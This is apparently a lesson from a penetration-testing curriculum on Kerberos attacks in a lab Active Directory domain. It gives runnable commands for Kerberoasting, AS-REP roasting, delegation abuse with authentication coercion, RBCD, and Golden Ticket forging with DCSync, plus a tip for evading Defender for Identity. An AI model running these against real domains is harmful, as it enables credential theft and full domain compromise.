# Phase 12: Kerberos — Protocol to Attacks

> **Why**: If Phase 10 gave you the theory, this phase makes you proficient. Each Kerberos attack becomes mechanically obvious when you understand the underlying protocol step it exploits.

**Study time**: 2 weeks | **Difficulty**: Intermediate–Advanced

---

## Learning Objectives

- [ ] Execute Kerberoasting and crack the hash in a lab
- [ ] Execute AS-REP roasting with and without credentials
- [ ] Exploit unconstrained delegation with coercion
- [ ] Exploit constrained delegation via S4U2Proxy
- [ ] Execute the full RBCD chain from GenericWrite to a shell
- [ ] Forge a Golden Ticket and use it for persistent access

---

## 1. Kerberoasting — Step by Step with Explanations

### Why each step does what it does

```bash
# Step 1: Find accounts with SPNs
GetUserSPNs.py lab.local/jdoe:Password1 -dc-ip <dc_ip>
# WHY: We need accounts where the KDC will give us a TGS encrypted with their password hash
# The -dc-ip flag tells Impacket where to send Kerberos AS-REQ then TGS-REQ

# Step 2: Request the tickets
GetUserSPNs.py lab.local/jdoe:Password1 -dc-ip <dc_ip> -request -outputfile kerb.hash
# WHY: -request sends a TGS-REQ for each SPN found
# The returned TGS is encrypted with the service account's NTLM hash
# -outputfile saves in hashcat format automatically

# Step 3: Crack offline
hashcat -m 13100 kerb.hash rockyou.txt
# WHY: The TGS encryption uses RC4 (or AES) with the service account's password hash as the key
# We're brute-forcing the key by trying every word in rockyou.txt until one decrypts correctly
# -m 13100 = Kerberos TGS-REP etype 23 (RC4) hash format
```

**What can go wrong**:
- Account uses AES tickets (not RC4) → use `-m 19700` for hashcat (AES256)
- Hash doesn't crack → try larger wordlist or rule-based attack: `hashcat -m 13100 hash.txt rockyou.txt -r rules/best64.rule`
- No SPNs found → no Kerberoastable accounts in this domain

---

## 2. AS-REP Roasting — No Credentials Needed

```bash
# With credentials (enumerate first)
GetNPUsers.py lab.local/jdoe:Password1 -dc-ip <dc_ip> -request -outputfile asrep.hash

# Without credentials — just need usernames
GetNPUsers.py lab.local/ -dc-ip <dc_ip> -no-pass -usersfile users.txt -outputfile asrep.hash

# Crack
hashcat -m 18200 asrep.hash rockyou.txt
```

**The mechanism**: Without pre-authentication, the AS-REQ doesn't include an encrypted timestamp. The DC sends back the first part of the TGT (the enc-part) encrypted with the user's password hash. Unlike Kerberoasting, no special access needed — just a valid username.

---

## 3. Unconstrained Delegation — Why It's Dangerous

**The design intent**: A web server in a DMZ needs to access a backend database on behalf of the user. The web server has unconstrained delegation → when the user authenticates to the web server, the web server gets the user's TGT and uses it to authenticate to the database.

**The attack**: You compromise the web server (unconstrained delegation host). You coerce the DC to authenticate to it. The DC's TGT lands in LSASS on the web server. You dump it. You inject it. You DCSync as the DC.

```bash
# Find non-DC hosts with unconstrained delegation
Get-DomainComputer -Unconstrained | Where {$_.Name -notmatch "DC"}

# On the unconstrained host — monitor for incoming TGTs
sliver (beacon) > execute-assembly ~/tools/Rubeus.exe monitor /interval:5 /filteruser:DC01$

# Coerce the DC to authenticate to the unconstrained host
# (from Kali, or any host that can reach the DC)
python3 printerbug.py 'lab.local/jdoe:Password1@dc01.lab.local' <unconstrained_host_ip>
# OR
python3 PetitPotam.py <unconstrained_host_ip> dc01.lab.local

# Rubeus captures the DC's TGT — inject and DCSync
sliver (beacon) > execute-assembly ~/tools/Rubeus.exe ptt /ticket:<base64>
sliver (beacon) > execute-assembly ~/tools/Mimikatz.exe "lsadump::dcsync /user:krbtgt" exit
```

---

## 4. RBCD — Resource-Based Constrained Delegation Chain

**Why RBCD is the most useful delegation attack**: It doesn't require a service account with delegation rights. If you have `GenericWrite` on ANY computer object, you can exploit RBCD against that computer.

**The mechanism**: Windows allows a computer to specify which accounts can delegate TO it via `msDS-AllowedToActOnBehalfOfOtherIdentity`. If you can write this attribute, you control who can impersonate users to that computer.

```bash
# Step 1: Create a computer account (or use existing one)
# WHY: S4U2Self requires a computer account or service account
addcomputer.py -computer-name 'FAKE$' -computer-pass 'FakePass1!' \
  lab.local/jdoe:Password1 -dc-ip <dc_ip>
# WHY addcomputer: regular domain users can create up to 10 computer accounts (MachineAccountQuota)

# Step 2: Write RBCD — allow FAKE$ to delegate to TARGET$
rbcd.py -action write -delegate-from 'FAKE$' -delegate-to 'TARGET$' \
  lab.local/jdoe:Password1 -dc-ip <dc_ip>
# WHY: This writes FAKE$'s SID into TARGET$'s msDS-AllowedToActOnBehalfOfOtherIdentity
# Now the KDC will issue S4U tickets for any user from FAKE$ to services on TARGET$

# Step 3: S4U2Self + S4U2Proxy — get a service ticket impersonating administrator
getST.py -spn cifs/target.lab.local -impersonate administrator \
  'lab.local/FAKE$:FakePass1!' -dc-ip <dc_ip>
# WHY: S4U2Self: FAKE$ asks for a ticket for administrator FROM administrator to FAKE$
# WHY: S4U2Proxy: FAKE$ uses that ticket to get a TGS for cifs/target$ on behalf of administrator

# Step 4: Use the ticket
export KRB5CCNAME=administrator@cifs_target.lab.local.ccache
psexec.py -k -no-pass target.lab.local
```

**Check MachineAccountQuota first**: `nxc ldap <dc_ip> -u jdoe -p Password1 -M maq`
If it's 0, you can't create computer accounts → need to use an existing compromised computer/service account.

---

## 5. Golden Ticket — Forging Domain-Wide Trust

```bash
# Prerequisites:
# 1. krbtgt NTLM hash (from DCSync)
# 2. Domain SID

# Get domain SID
lookupsid.py lab.local/administrator:Password1@<dc_ip> | grep "Domain SID"

# Forge ticket (Linux)
ticketer.py -nthash <krbtgt_hash> -domain-sid S-1-5-21-... \
  -domain lab.local administrator
# Creates administrator.ccache

export KRB5CCNAME=administrator.ccache
secretsdump.py -k -no-pass dc01.lab.local

# Windows (Rubeus)
sliver (beacon) > execute-assembly ~/tools/Rubeus.exe golden \
  /user:administrator /rc4:<krbtgt_hash> \
  /domain:lab.local /sid:S-1-5-21-... /ptt
```

**Why the domain SID matters**: The ticket's PAC contains the user's SID. The DC validates that the domain portion matches. Wrong domain SID = authentication failure.

**Why use AES instead of RC4**: Defender for Identity detects RC4 Golden Tickets because modern domains use AES by default. Use `/aes256:<krbtgt_aes256_key>` if available.

---

## Practice Labs

| Lab | Platform | Focus |
|-----|---------|-------|
| [THM: Attacking Kerberos](https://tryhackme.com/room/attackingkerberos) | THM (Free) | Kerberoast, AS-REP, pass-ticket |
| [HTB: Forest](https://app.hackthebox.com/machines/Forest) | HTB (Free) | AS-REP → DCSync |
| [HTB: Active](https://app.hackthebox.com/machines/Active) | HTB (Free) | Kerberoasting → DA |
| [GOAD: Delegation paths](https://github.com/Orange-Cyberdefense/GOAD) | Local | Full delegation chain practice |

---

## Phase 12 Mastery Checklist

- [ ] Can you Kerberoast, crack the hash, and explain every step without notes?
- [ ] Can you AS-REP roast without credentials (just usernames)?
- [ ] Can you exploit unconstrained delegation with coercion?
- [ ] Can you execute the full RBCD chain (addcomputer → rbcd → getST → shell)?
- [ ] Can you forge a Golden Ticket and use it to DCSync?
- [ ] Can you explain why S4U2Self → S4U2Proxy gives you impersonation rights?

---

## Next Phase → **Phase 13: Domain Privilege Escalation**
